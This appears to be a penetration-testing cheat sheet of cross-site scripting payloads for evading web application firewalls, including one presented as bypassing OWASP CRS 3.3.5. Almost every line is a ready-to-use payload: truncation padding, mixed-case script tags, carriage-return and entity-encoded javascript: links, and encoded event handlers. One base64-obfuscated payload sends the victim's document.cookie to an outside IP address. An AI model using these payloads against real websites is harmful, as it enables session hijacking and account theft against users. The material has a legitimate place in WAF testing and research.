# XSS WAF Bypass

### 1) XSS Truncation

The number of pad characters depends on the configured WAF rule

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>

### 2) OWASP CRS 3.3.5 Bypass

Base64 encoded payload: fetch('http://10.201.82.177:8000/'+encodeURIComponent(document.cookie))

    <a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("ZmV0Y2goJ2h0dHA6Ly8xMC4yMDEuODIuMTc3OjgwMDAvJytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKSk="))>Click Here</a>

### 3) Mixed-Case Format

    <scrIpT>aLerT(1)</scrIpT>

### 4) White Space and Delimiters

    <a/href=j&#x0D;avascript:a&#x0D;lert(1)>aaa</a>

### 5) HTML Entity Encoding

Full Decimal Encoding

    <body onload=&#97;&#108;&#101;&#114;&#116;(1)>

Hex encoding for 'alert'

    <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

Decimal encoding for 'a'

    <img src=x onerror=&#97;lert(1)>

